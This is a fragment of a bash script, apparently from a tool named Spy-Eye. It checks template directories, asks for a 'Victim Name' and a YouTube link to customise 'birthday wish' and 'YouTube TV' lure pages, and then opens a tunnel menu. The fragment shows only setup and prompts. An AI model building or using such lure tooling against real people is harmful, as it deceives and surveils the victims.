...
# Spy_Eye.sh calls this AFTER load_lib() so SCRIPT_DIR is already set.
# ─────────────────────────────────────────────────────────────────────────────
init_setup() {
...
# ─────────────────────────────────────────────────────────────────────────────
# verify template + Spy-Eye dirs exist and are non-empty
# ─────────────────────────────────────────────────────────────────────────────
_check_template_dir() {
    local path="$1"
    if [ ! -d "$path" ] || [ -z "$(ls -A "$path" 2>/dev/null)" ] || \
       [ ! -d "$EYE_PATH" ] || [ -z "$(ls -A "$EYE_PATH" 2>/dev/null)" ]; then
        ...
        echo -e "    ${red}[${orange}!${red}]${red} Exiting...${nocolor}"
        exit 1
    fi
}
...
setup_birthday_wish() {
    ...
    echo -e ""
    read -p "    ${cyan}[${red}+${cyan}]${white} Enter Victim Name: ${green}" newname
    echo -e "${nocolor}"
    ...
    echo -e "    ${cyan}[${blue}+${cyan}]${white} Victim name set to: ${blue}$newname${nocolor}"
    sleep 1
    tunnel_menu
}
...
setup-youtube-tv() {
    ...
    echo -e ""
    read -p "    ${cyan}[${red}+${cyan}]${white} Enter YouTube video link: ${green}" yt_vid_link
    echo -e "${nocolor}"
    ...
    if [[ ${#VIDEO_ID} -eq 11 ]]; then
        echo -e "    ${cyan}[${blue}+${cyan}]${white} Video ID found: ${green}$VIDEO_ID${nocolor}"
